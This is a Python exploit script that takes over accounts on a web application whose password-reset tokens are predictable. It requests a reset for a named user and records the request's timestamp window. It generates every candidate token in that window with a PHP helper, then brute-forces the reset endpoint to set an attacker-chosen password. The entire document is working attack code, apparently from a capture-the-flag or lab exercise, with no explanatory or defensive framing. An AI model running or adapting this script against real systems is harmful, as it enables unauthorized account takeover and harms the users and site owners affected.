import requests
import sys
import subprocess
import time




def collect_tokens(ts_lower,ts_upper):
    tokens = subprocess.check_output(["php", "generateToken.php", str(ts_lower), str(ts_upper)])
    tokens = tokens[:-1].decode().split("\n")
    print(f"[*] Generated {ts_upper - ts_lower} possible tokens between {ts_lower} and {ts_upper}")
    return tokens

def rest_password(target_url, tokens, target_user, new_password):
    print(f"[*] Requested password reset for {target_user}")
    for token in tokens:
        sys.stdout.flush()
        r = requests.post(
            f"{target_url}/resetpassword.php",data={"token":token,"password1":new_password,"password2":new_password}
        )
        if "Password changed!" in r.text:
            print(f"\n[+] Set {target_user}'s password to {new_password}")

def main():
    if len(sys.argv) < 4:
        print(f"Usage:")
        print(f"  python3 {sys.argv[0]} <target_url> <target_user> <new_password>")
        print()
        sys.exit(1)

    target_url  = sys.argv[1].rstrip("/")
    target_user   = sys.argv[2]
    new_password    = sys.argv[3]

    ts_lower = int(time.time()*1000)
    r = requests.post(
        f"{target_url}/forgotpassword.php",
        data={"username":target_user}
    )
    ts_upper = int(time.time()*1000)
    assert "Email sent!" in r.text
    print(f"[*] Requested password reset for {target_user}")

    try:
        tokens = collect_tokens(ts_lower,ts_upper)
        rest_password(target_url, tokens, target_user, new_password)
        
    except Exception as e:
        print(f"[-] Failed to generate tokens: {e}")
        exit(1)

if __name__ == "__main__":
    main()